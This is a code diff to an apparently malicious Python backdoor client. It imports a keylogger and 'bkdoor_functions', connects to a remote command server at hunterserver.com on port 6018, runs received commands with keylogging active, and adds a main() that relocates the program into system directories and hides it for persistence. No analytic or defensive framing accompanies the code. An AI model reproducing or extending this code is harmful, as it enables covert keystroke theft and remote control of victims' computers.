@@ -1,6 +1,9 @@
-import socket, os
 from client_commands import *
+from bkdoor_functions import *
 from keylogger import Keylogger
+from pathlib import Path
+import socket, os, time
+
 
 def run(host, port):
     try:
@@ -9,7 +12,7 @@ def run(host, port):
             client_socket.connect((host, port))
         except:
             return
-        
+
         klogger = Keylogger()
         while True:
             command = client_socket.recv()
@@ -70,5 +73,15 @@ def run(host, port):
         return
 
 
-if "__main__" == __name__:
-    run(host="hunterserver.com", port=6018)
+def main():
+    system_path = "C:\\ProgramData\\" if sys.platform == "win32" else "/usr/local/bin/"
+
+    if Path(os.getcwd()) != Path(system_path):
+        extract_encoded()
+        makehidden()
+    else:
+        pass
+
+
+# if "__main__" == __name__:
+#     run(host="hunterserver.com", port=6018)
